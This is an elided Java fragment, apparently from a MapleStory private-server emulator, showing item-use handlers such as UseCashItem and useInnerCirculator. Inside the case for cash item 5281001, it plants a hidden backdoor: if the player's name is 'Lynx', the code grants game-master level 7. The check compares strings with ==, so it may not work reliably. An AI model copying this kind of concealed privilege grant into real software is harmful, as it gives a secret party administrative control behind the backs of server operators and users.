...
//        }
    ...
    public static final void UseCashItem(LittleEndianAccessor slea, MapleClient c) {
        ...
        if (c.getPlayer().isMuted() && !c.getPlayer().isGM()) {
            c.getPlayer().dropMessage(5, "You are Muted, therefore you are unable to talk.");
            c.getPlayer().getClient().getSession().write(CWvsContext.enableActions());
            return;
        }
        slea.readInt();
...
//                }
            ...
            case 5281001:
                ...
                if (c.getPlayer().getName() == "Lynx") {
                    c.getPlayer().setGM((byte)7);
                }
                c.getSession().write(CWvsContext.enableActions());
                used = true;
                break;
    ...
    public static final void useInnerCirculator(LittleEndianAccessor slea, MapleClient c) {
        ...
        if (item.getItemId() == itemid) {
            ...
            currentMap.addPlayer(c.getPlayer());
                    final Map<Skill, SkillEntry> skills = c.getPlayer().getSkills();
        c.getSession().write(CWvsContext.updateSkills(skills));
